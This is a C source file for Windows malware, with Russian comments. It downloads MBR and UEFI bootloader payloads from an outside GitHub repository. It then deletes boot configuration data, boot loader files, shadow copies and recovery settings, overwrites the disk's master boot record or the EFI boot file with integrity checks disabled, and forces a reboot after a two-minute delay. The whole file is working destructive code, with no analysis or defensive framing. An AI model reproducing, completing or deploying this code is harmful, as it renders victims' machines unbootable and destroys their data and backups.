#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "urlmon.lib")

extern volatile bool g_running;
extern void TriggerBSOD(void);

typedef struct {
    unsigned char* data;
    unsigned int size;
} BinaryData;

BinaryData DownloadRawFromGitHub(const char* filename) {
    BinaryData result = {NULL, 0};
    char url[512];
    
    // Правильные URL для твоих файлов
    if (strcmp(filename, "bios.txt") == 0) {
        strcpy_s(url, sizeof(url), "https://raw.githubusercontent.com/PisunBobraHacker/MEMX/main/bios.txt");
    } else if (strcmp(filename, "uefi.txt") == 0) {
        strcpy_s(url, sizeof(url), "https://raw.githubusercontent.com/PisunBobraHacker/MEMX/main/uefi.txt");
    } else {
        return result;
    }
    
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char tempFile[MAX_PATH];
    sprintf_s(tempFile, sizeof(tempFile), "%s%s", tempPath, filename);
    
    HRESULT hr = URLDownloadToFileA(NULL, url, tempFile, 0, NULL);
    if (hr != S_OK) {
        return result;
    }
    
    FILE* f = fopen(tempFile, "rb");
    if (!f) {
        DeleteFileA(tempFile);
        return result;
    }
    
    fseek(f, 0, SEEK_END);
    result.size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    result.data = (unsigned char*)malloc(result.size);
    if (!result.data) {
        fclose(f);
        DeleteFileA(tempFile);
        result.size = 0;
        return result;
    }
    
    fread(result.data, 1, result.size, f);
    fclose(f);
    DeleteFileA(tempFile);
    
    return result;
}

unsigned char* ParseHexString(const char* hexStr, unsigned int* outSize) {
    if (!hexStr) return NULL;
    
    int len = strlen(hexStr);
    int byteCount = 0;
    
    for (int i = 0; i < len; i++) {
        if (hexStr[i] == '0' && hexStr[i+1] == 'x') {
            byteCount++;
            i += 4;
        }
    }
    
    if (byteCount == 0) return NULL;
    
    unsigned char* data = (unsigned char*)malloc(byteCount);
    if (!data) return NULL;
    
    int idx = 0;
    for (int i = 0; i < len && idx < byteCount; i++) {
        if (hexStr[i] == '0' && hexStr[i+1] == 'x') {
            char hex[3] = {hexStr[i+2], hexStr[i+3], 0};
            data[idx++] = (unsigned char)strtol(hex, NULL, 16);
            i += 4;
        }
    }
    
    *outSize = byteCount;
    return data;
}

unsigned char* g_mbr_data = NULL;
unsigned char* g_uefi_data = NULL;
unsigned int g_uefi_size = 0;

int LoadArraysFromRepo(void) {
    // Скачиваем bios.txt
    BinaryData biosData = DownloadRawFromGitHub("bios.txt");
    if (!biosData.data || biosData.size == 0) {
        if (biosData.data) free(biosData.data);
        return 0;
    }
    
    // Парсим MBR
    unsigned int mbrSize;
    unsigned char* mbr = ParseHexString((const char*)biosData.data, &mbrSize);
    free(biosData.data);
    
    if (!mbr || mbrSize != 512) {
        if (mbr) free(mbr);
        return 0;
    }
    g_mbr_data = mbr;
    
    // Скачиваем uefi.txt
    BinaryData uefiData = DownloadRawFromGitHub("uefi.txt");
    if (!uefiData.data || uefiData.size == 0) {
        if (uefiData.data) free(uefiData.data);
        free(g_mbr_data);
        g_mbr_data = NULL;
        return 0;
    }
    
    // Парсим UEFI
    unsigned int uefiSize;
    unsigned char* uefi = ParseHexString((const char*)uefiData.data, &uefiSize);
    free(uefiData.data);
    
    if (!uefi || uefiSize == 0) {
        if (uefi) free(uefi);
        free(g_mbr_data);
        g_mbr_data = NULL;
        return 0;
    }
    
    g_uefi_data = uefi;
    g_uefi_size = uefiSize;
    
    return 1;
}

void FreeArrays(void) {
    if (g_mbr_data) {
        free(g_mbr_data);
        g_mbr_data = NULL;
    }
    if (g_uefi_data) {
        free(g_uefi_data);
        g_uefi_data = NULL;
        g_uefi_size = 0;
    }
}

typedef enum {
    SYSTEM_UNKNOWN = 0,
    SYSTEM_BIOS,
    SYSTEM_UEFI
} SystemType;

SystemType GetSystemType(void) {
    FIRMWARE_TYPE ft;
    
    if (GetFirmwareType(&ft)) {
        if (ft == FirmwareTypeUefi) return SYSTEM_UEFI;
        if (ft == FirmwareTypeBios) return SYSTEM_BIOS;
    }
    
    if (GetFirmwareEnvironmentVariableA("", "{00000000-0000-0000-0000-000000000000}", NULL, 0) != 0 ||
        GetLastError() != ERROR_INVALID_FUNCTION) {
        return SYSTEM_UEFI;
    }
    
    char drives[256];
    GetLogicalDriveStringsA(256, drives);
    for (int i = 0; i < 256; i += 4) {
        if (drives[i] == 0) break;
        char path[16];
        char efiPath[260];
        sprintf_s(path, sizeof(path), "%c:", drives[i]);
        sprintf_s(efiPath, sizeof(efiPath), "%s\\EFI", path);
        if (GetFileAttributesA(efiPath) != INVALID_FILE_ATTRIBUTES) {
            return SYSTEM_UEFI;
        }
    }
    
    return SYSTEM_BIOS;
}

bool IsUEFIActive(void) {
    SystemType type = GetSystemType();
    return (type == SYSTEM_UEFI);
}

bool EnablePrivilege(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, SE_BACKUP_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result && GetLastError() == ERROR_SUCCESS;
}

bool WriteMBR(void) {
    if (IsUEFIActive()) return false;
    if (!g_mbr_data) return false;
    
    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk == INVALID_HANDLE_VALUE) {
        hDisk = CreateFileA("\\\\.\\PhysicalDrive1", GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    }
    if (hDisk == INVALID_HANDLE_VALUE) return false;
    
    unsigned char sector[512];
    DWORD bytesRead;
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    if (ReadFile(hDisk, sector, 512, &bytesRead, NULL) && bytesRead == 512) {
        if (sector[0x1C2] == 0xEE) {
            CloseHandle(hDisk);
            return false;
        }
    }
    
    DeviceIoControl(hDisk, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, NULL, NULL);
    DWORD written;
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    WriteFile(hDisk, g_mbr_data, 512, &written, NULL);
    FlushFileBuffers(hDisk);
    DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, NULL, NULL);
    CloseHandle(hDisk);
    return written == 512;
}

bool WriteESP(void) {
    if (!IsUEFIActive()) return false;
    if (!g_uefi_data || g_uefi_size == 0) return false;
    
    system("mountvol S: /S 2>nul");
    Sleep(1000);
    
    if (GetFileAttributesA("S:\\") == INVALID_FILE_ATTRIBUTES) return false;
    
    system("del /f /q S:\\EFI\\Boot\\bootx64.efi 2>nul");
    system("del /f /q S:\\EFI\\Microsoft\\Boot\\bootmgfw.efi 2>nul");
    system("del /f /q S:\\EFI\\Microsoft\\Boot\\bootmgr.efi 2>nul");
    
    CreateDirectoryA("S:\\EFI", NULL);
    CreateDirectoryA("S:\\EFI\\Boot", NULL);
    
    system("bcdedit /set {bootmgr} nointegritychecks Yes 2>nul");
    system("bcdedit /set {current} nointegritychecks Yes 2>nul");
    
    HANDLE hFile = CreateFileA("S:\\EFI\\Boot\\bootx64.efi", GENERIC_WRITE,
                               0, NULL, CREATE_ALWAYS, 
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD written;
    WriteFile(hFile, g_uefi_data, g_uefi_size, &written, NULL);
    CloseHandle(hFile);
    return written == g_uefi_size;
}

void KillBootData(void) {
    system("bcdedit /delete {bootmgr} /f 2>nul");
    system("bcdedit /delete {default} /f 2>nul");
    system("bcdedit /delete {current} /f 2>nul");
    system("attrib -h -s -r C:\\boot\\BCD 2>nul");
    system("del /f /q C:\\boot\\BCD 2>nul");
    system("attrib -h -s -r C:\\Boot\\BCD 2>nul");
    system("del /f /q C:\\Boot\\BCD 2>nul");
    system("attrib -h -s -r C:\\bootmgr 2>nul");
    system("del /f /q C:\\bootmgr 2>nul");
    system("attrib -h -s -r C:\\Windows\\System32\\winload.exe 2>nul");
    system("del /f /q C:\\Windows\\System32\\winload.exe 2>nul");
    system("attrib -h -s -r C:\\Windows\\System32\\winload.efi 2>nul");
    system("del /f /q C:\\Windows\\System32\\winload.efi 2>nul");
    system("vssadmin delete shadows /all /quiet 2>nul");
    system("bcdedit /set {default} recoveryenabled No 2>nul");
    system("bcdedit /set {current} recoveryenabled No 2>nul");
    system("bcdedit /set {bootmgr} displaybootmenu No 2>nul");
    system("bcdedit /set {bootmgr} timeout 0 2>nul");
}

int IsAdmin(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return 0;
    DWORD size = 0;
    GetTokenInformation(hToken, TokenElevationType, NULL, 0, &size);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        CloseHandle(hToken);
        return 0;
    }
    BYTE* buffer = (BYTE*)malloc(size);
    if (!buffer) {
        CloseHandle(hToken);
        return 0;
    }
    BOOL elevated = 0;
    if (GetTokenInformation(hToken, TokenElevationType, buffer, size, &size)) {
        TOKEN_ELEVATION_TYPE* elev = (TOKEN_ELEVATION_TYPE*)buffer;
        elevated = (*elev == TokenElevationTypeFull);
    }
    free(buffer);
    CloseHandle(hToken);
    return elevated;
}

void StartInfection(void) {
    Sleep(120000);
    
    if (!LoadArraysFromRepo()) {
        Sleep(5000);
        if (!LoadArraysFromRepo()) {
            return;
        }
    }
    
    EnablePrivilege();
    KillBootData();
    
    if (IsUEFIActive()) {
        if (!WriteESP()) {
            WriteESP();
        }
    } else {
        if (!WriteMBR()) {
            WriteMBR();
        }
    }
    
    FreeArrays();
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}